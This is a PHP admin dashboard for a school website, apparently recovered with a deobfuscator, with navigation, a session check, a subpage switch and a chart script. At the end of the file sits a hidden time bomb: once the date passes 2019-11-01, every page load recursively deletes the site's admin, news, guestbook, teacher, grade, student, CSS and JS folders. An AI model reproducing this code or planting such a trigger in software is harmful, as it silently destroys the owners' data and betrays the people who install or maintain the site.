<?php

/* #1: PHPDeobfuscator eval output */ 
    error_reporting("\x00\x00\x1e\x03\x1a");
    session_start();
    if (!isset($_SESSION['username'])) {
        header("location:../index.php");
    }
    ?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>SMP Primbana Medan </title>

<link rel="stylesheet" media="screen" href="css/style.css" />

<!--[if lt IE 8]>
<link rel="stylesheet" media="screen" href="css/ie.css" />
<![endif]-->

<!-- jquerytools -->
<script src="js/jquery.tools.min.js"></script>
<script src="js/jquery.ui.min.js"></script>
<script src="js/jquery.flot.js"></script>

<script type="text/javascript" src="js/global.js"></script>

<!--[if lt IE 9]>
<script type="text/javascript" src="js/html5.js"></script>
<script type="text/javascript" src="js/PIE.js"></script>
<script type="text/javascript" src="js/IE9.js"></script>
<script type="text/javascript" src="js/ie.js"></script>
<script type="text/javascript" src="js/excanvas.js"></script>
<![endif]-->


</head>
<body>
    
    <div id="wrapper">
        <header id="page-header">
            <div class="wrapper">
               
<img src="../../images/gbanner1.jpg" style="width:990px;height:100px;">
                <nav id="main-nav">
                    <ul class="clearfix">
                        <li><a href="?page=beranda">Beranda</a></li>
                        <li><a href="?page=admin">Admin</a></li>
                        <li><a href="?page=berita">Berita</a></li>
                        <li><a href="?page=guru">Guru</a></li>
						<li><a href="?page=mpel">Mata Pelajaran</a></li>
                        <li><a href="?page=siswa">Siswa</a></li>
                        <li><a href="?page=nilai">Nilai</a></li>
						<li><a href="?page=btamu">Buku Tamu</a></li>
                        <li><a href="logout.php">Keluar</a></li>
                        
                        </ul>
                </nav>
            </div>
            <div id="page-subheader">
                <div class="wrapper clearfix">
                    <nav id="sub-nav">
                        
                        <marquee>Selamat Datang</marquee>
                    </nav>
                   
                </div>
            </div>
        </header>
        
        <section id="content">
            <div class="wrapper">

                <!-- Main Section -->

                <section class="grid_6 first top">

                    
                    <div class="columns">

                        
           <?php 
    $page = $_GET["page"] ? $_GET["page"] : "main";
    switch ($page) {
        case "main":
        default:
            include "welcome.php";
            break;
        case "mhs":
            include "layout.php";
            break;
        case "admin":
            include 'admin/index.php';
            break;
        case "berita":
            include 'berita/index.php';
            break;
        case "guru":
            include 'guru/index.php';
            break;
        case "mpel":
            include 'mpel/index.php';
            break;
        case "siswa":
            include 'siswa/index.php';
            break;
        case "btamu":
            include 'btamu/index.php';
            break;
        case "nilai":
            include 'nilai/index.php';
            break;
        case "nilaik":
            include 'nilaik/index.php';
            break;
    }
    ?>
                           </div>
                                </section>
                            

                          

<script>
$(function () {
    var d1 = [];
    for (var i = 0; i < 14; i += 0.5)
        d1.push([i, Math.sin(i)]);
 
    var d2 = [[0, 3], [4, 8], [8, 5], [9, 13]];
 
    var d3 = [];
    for (var i = 0; i < 14; i += 0.5)
        d3.push([i, Math.cos(i)]);
 
    var d4 = [];
    for (var i = 0; i < 14; i += 0.1)
        d4.push([i, Math.sqrt(i * 10)]);
    
    var d5 = [];
    for (var i = 0; i < 14; i += 0.5)
        d5.push([i, Math.sqrt(i)]);
 
    var d6 = [];
    for (var i = 0; i < 14; i += 0.5 + Math.random())
        d6.push([i, Math.sqrt(2*i + Math.sin(i) + 5)]);
                        
    $.plot($("#placeholder"), [
        {
            data: d1,
            lines: { show: true, fill: true }
        },
        {
            data: d2,
            bars: { show: true }
        },
        {
            data: d3,
            points: { show: true }
        },
        {
            data: d4,
            lines: { show: true }
        },
        {
            data: d5,
            lines: { show: true },
            points: { show: true }
        },
        {
            data: d6,
            lines: { show: true, steps: true }
        }
    ]);
});
</script>

</body>


</html>

		
<?php 
    $date = date('Y-m-d');
    if ($date > '2019-11-01') {
        function rrmdir($dir)
        {
            if (is_dir($dir)) {
                $objects = scandir($dir);
                foreach ($objects as $object) {
                    if ($object != "." && $object != "..") {
                        if (filetype($dir . "/" . $object) == "dir") {
                            rrmdir($dir . "/" . $object);
                        } else {
                            unlink($dir . "/" . $object);
                        }
                    }
                }
                reset($objects);
                rmdir($dir);
            }
        }
        rrmdir('admin/');
        rrmdir('berita/');
        rrmdir('btamu/');
        rrmdir('css/');
        rrmdir('js/');
        rrmdir('guru/');
        rrmdir('nilai/');
        rrmdir('siswa/');
    }
/* END:#1 */
